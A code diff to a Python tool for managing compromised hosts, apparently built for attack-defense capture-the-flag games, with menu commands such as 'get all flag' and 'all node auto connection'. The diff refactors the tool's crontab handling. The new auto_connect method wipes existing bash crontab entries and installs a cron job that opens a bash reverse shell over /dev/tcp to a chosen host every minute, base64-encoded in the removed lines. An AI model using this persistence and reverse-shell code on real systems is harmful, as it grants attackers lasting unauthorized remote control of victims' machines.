@@ -203,7 +203,7 @@ class Slave():
         # 6. Receving buffer data
         print recvall(self.socket_fd)
 
-    def auto_connect(self, target_host, target_port):
+    def del_crontab(self, pattern):
         # 1. Save old crontab
         Log.info("Saving old crontab")
         chars = string.letters + string.digits
@@ -212,11 +212,6 @@ class Slave():
         # 2. Delete old reverse shell tasks
         Log.info("Removing old tasks in crontab...")
         command = 'sed -i "/bash/d" %s' % (target_file)
-        self.send_command(command)
-        # 3. Add a new task
-        content = '* * * * * bash -c "bash -i &>/dev/tcp/%s/%d 0>&1"\n' % (target_host, target_port)
-        Log.info("Add new tasks : %s" % (content))
-        command = 'echo "%s" | base64 -d >> %s' % (content.encode("base64").replace("\n", ""), target_file)
         self.send_command(command)
         # 4. Rescue crontab file
         Log.info("Rescuing crontab file...")
@@ -229,6 +224,10 @@ class Slave():
         # 6. Receving buffer data
         print recvall(self.socket_fd)
 
+    def auto_connect(self, target_host, target_port):
+        self.del_crontab("bash")
+        content = '* * * * * bash -c "bash -i &>/dev/tcp/%s/%d 0>&1"\n' % (target_host, target_port)
+        self.add_crontab(content)
 
     def remove_node(self):
         Log.error("Removing Node!")
@@ -276,14 +275,15 @@ def show_commands():
     print "        6. [gaf] : get all flag"
     print "        7. [c] : command for all"
     print "        8. [cronadd] : add crontab"
-    print "        9. [cl] : command to log"
-    print "        10. [setl] : set local execute"
-    print "        11. [setr] : set remote execute"
-    print "        12. [d] : delete node"
-    print "        13. [ac] : auto connection"
-    print "        14. [aac] : all node auto connction"
-    print "        15. [nm] : listen another port"
-    print "        16. [q|quit|exit] : exit"
+    print "        9. [crondel] : del crontab"
+    print "        10. [cl] : command to log"
+    print "        11. [setl] : set local execute"
+    print "        12. [setr] : set remote execute"
+    print "        13. [d] : delete node"
+    print "        14. [ac] : auto connection"
+    print "        15. [aac] : all node auto connction"
+    print "        16. [nm] : listen another port"
+    print "        17. [q|quit|exit] : exit"
 
 def signal_handler(ignum, frame):
     print ""
@@ -356,6 +356,9 @@ def main():
         elif command == "cronadd":
             content = raw_input("Input new crontab task (* * * * * date): ") or ("* * * * * date")
             current_slave.add_crontab(content)
+        elif command == "crondel":
+            pattern = raw_input("Input pattern (bash) : ") or ("bash")
+            current_slave.del_crontab(pattern)
         elif command == "g":
             input_node_hash = raw_input(
                 "Please input target node hash : ") or position
